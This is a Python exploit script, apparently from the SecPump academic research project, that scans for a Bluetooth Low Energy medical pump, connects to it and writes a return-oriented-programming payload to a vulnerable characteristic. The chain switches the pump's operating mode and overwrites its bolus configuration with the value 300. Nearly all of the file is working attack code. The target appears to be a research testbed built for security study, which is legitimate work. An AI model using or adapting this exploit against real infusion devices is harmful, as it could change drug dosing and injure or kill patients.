#############################################################################
# Copyright (C) 2019 LCIS Laboratory - Cyril Bresch
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
#     the Free Software Foundation, in version 3.
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.
# This program is part of the SecPump @https://github.com/r3glisss/SecPump
#############################################################################
import struct
import sys
import signal
import time

from pwn import *
from Utils import *
from bluepy.btle import Scanner, DefaultDelegate, Peripheral


class ScanDelegate(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)

    def handleDiscovery(self, dev, isNewDev, isNewData):
        if isNewDev:
            print BLUE_ALERT("Discovered device"), dev.addr
        elif isNewData:
            print BLUE_ALERT("Received new data from"), dev.addr


def FindBLEDevice(devices):
    for dev in devices:
        print "Device %s (%s), RSSI=%d dB" % (dev.addr, dev.addrType, dev.rssi)
        for (adtype, desc, value) in dev.getScanData():
            print "  %s = %s" % (desc, value)
            if "SecPump" in value:
                print GREEN_ALERT("Found Medical Pump")
                return dev


def SignalHandler(sig, frame):
    print('[!] Exiting the Program')
    sys.exit(0)


def ConnectDevice(device):
    print YELLOW_ALERT(WHITE_BOLD("Stage 2 - Connecting to Device..."))
    dev = Peripheral(device.addr)
    return dev


def DisconnectDevice(device):
    print RED_ALERT("Disconnecting from Device...")
    device.disconnect()


def DisplayServices(device):
    print BLUE_ALERT("Discovering Services...")
    for svc in device.services:
        print svc


def GetPumpService(device, name):
    if name == "Pump":
        print GREEN_ALERT("Accessing Pump Service")
        return device.getServiceByUUID("42821A40-E477-11E2-82D0-0002A5D5C51B")


def GetPumpCharacteristics(service, name):
    if service.uuid == "42821A40-E477-11E2-82D0-0002A5D5C51B":
        for char in service.getCharacteristics():
            if name == "MODE":
                if char.uuid == "CD20C480-E48B-11E2-840B-0002A5D5C51B":
                    print GREEN_ALERT("Getting MANUAL characteristic")
                    return char
            if name == "BOLUS":
                if char.uuid == "A32E5520-E477-11E2-A9E3-0002A5D5C51B":
                    print GREEN_ALERT("Getting BOLUS characteristic")
                    return char

            if name == "VULNERABILITY":
                if char.uuid == "01C50B60-E48C-11E2-A073-0002A5D5C51B":
                    print GREEN_ALERT("Getting VULN characteristic")
                    return char


def WriteCharacteristic(charac, msg):
    charac.write(msg, True)


def main(argv):
    print YELLOW_ALERT(WHITE_BOLD("Stage 1 - Scanning nearby Devices"))
    signal.signal(signal.SIGINT, SignalHandler)

    scanner = Scanner().withDelegate(ScanDelegate())
    # Fedora 30 bug fixe
    devices = scanner.scan(10.0, passive=True)

    device = FindBLEDevice(devices)
    deviceConnect = ConnectDevice(device)
    DisplayServices(deviceConnect)
    """ Getting Characteristics from Command service"""
    service = GetPumpService(deviceConnect, "Pump")
    manualchar = GetPumpCharacteristics(service, "MODE")
    bolusChar = GetPumpCharacteristics(service, "BOLUS")
    vulnChar = GetPumpCharacteristics(service, "VULNERABILITY")

    print YELLOW_ALERT(WHITE_BOLD("Stage 3 - Injecting Payload"))
    # Padding bytes
    i = 1
    length = i * 16
    print GREEN_ALERT("Part {}, injected {} bytes [DONE]".format(i, length))
    payload = "A" * 4
    payload += "B" * 4
    payload += "C" * 4
    payload += p32(0x08004e73)  # RA is controlled here, pop {r3, r4, r5, pc}
    WriteCharacteristic(vulnChar, payload)
    sleep(0.1)

    # Beginning of the payload
    i += 1
    length = i * 16
    print GREEN_ALERT("Part {}, injected {} bytes [DONE]".format(i, length))
    payload = p32(0x1)  # Changing mode, r3
    payload += p32(0x41414141)  # Padding, r4
    payload += p32(0x20000470)  # OPERATING MODE ADDR, r5
    payload += p32(0x0800537d)  # str r3, [r5] ; pop {r3, r4, r5, pc}
    WriteCharacteristic(vulnChar, payload)
    sleep(0.1)

    # Beginning of the payload
    i += 1
    length = i * 16
    print GREEN_ALERT("Part {}, injected {} bytes [DONE]".format(i, length))
    payload = p32(0x43960000)  # Injecting 300, r3
    payload += p32(0x41414141)  # Padding, r4
    payload += p32(0x20001af0)  # BolusConfig ADDR, r5
    payload += p32(0x0800537d)  # str r3, [r5] ; pop {r3, r4, r5, pc}
    WriteCharacteristic(vulnChar, payload)
    sleep(0.1)

    # Beginning of the payload
    i += 1
    length = i * 16
    print GREEN_ALERT("Part {}, injected {} bytes [DONE]".format(i, length))
    payload = p32(0x41414141)  # Padding, r3
    payload += p32(0x41414141)  # Padding, r4
    payload += p32(0x41414141)  # Padding, r5
    payload += p32(0x08006a0f)  # Return Point
    WriteCharacteristic(vulnChar, payload)
    sleep(0.1)

    # Beginning of the payload
    i += 1
    length = i * 16
    print GREEN_ALERT("Part {}, injected {} bytes [DONE]".format(i, length))
    payload = "E" * 4
    payload += "F" * 4
    payload += "G" * 4
    payload += "H" * 4
    WriteCharacteristic(vulnChar, payload)
    sleep(0.1)

    # Beginning of the payload
    i += 1
    length = i * 16
    print GREEN_ALERT("Part {}, injected {} bytes [DONE]".format(i, length))
    payload = "I" * 4
    payload += "J" * 4
    payload += "K" * 4
    payload += "L" * 4
    WriteCharacteristic(vulnChar, payload)
    sleep(0.1)

    # Beginning of the payload
    i += 1
    length = i * 16
    print GREEN_ALERT("Part {}, injected {} bytes [DONE]".format(i, length))
    payload = "M" * 4
    payload += "N" * 4
    payload += "O" * 4
    payload += "P" * 4
    WriteCharacteristic(vulnChar, payload)
    sleep(0.1)

    DisconnectDevice(deviceConnect)


if __name__ == '__main__':
    sys.exit(main(sys.argv))
